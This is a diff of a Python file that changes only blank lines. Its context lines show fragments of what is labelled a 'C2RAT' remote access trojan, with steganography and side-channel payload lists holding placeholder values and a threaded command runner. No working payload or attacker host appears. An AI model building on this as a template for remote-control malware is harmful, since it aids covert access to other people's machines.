@@ -15,6 +15,7 @@ COMMANDS = {
 STEGANOGRAPHY_IMAGES = [("image1.jpg", "payload1"), ("image2.jpg", "payload2")]
 SIDE_CHANNELS = {1: ("file1.txt", "payload3"), 2: ("file2.txt", "payload4")}
 
+
 class Steganography:
     def __init__(self):
         self.image = Image.new("RGB", (512, 512))
@@ -175,6 +176,7 @@ class C2RAT:
     def open_browser(self, url):
         webbrowser.open(url)
 
+
 # Example usage:
 if __name__ == "__main__":
     rat = C2RAT()
@@ -201,5 +203,3 @@ if __name__ == "__main__":
             thread_name = str(os.getpid()) + "_" + command
             rat.start_thread(command)
             print("Executing command", command, "in a new thread named", thread_name)
-
-
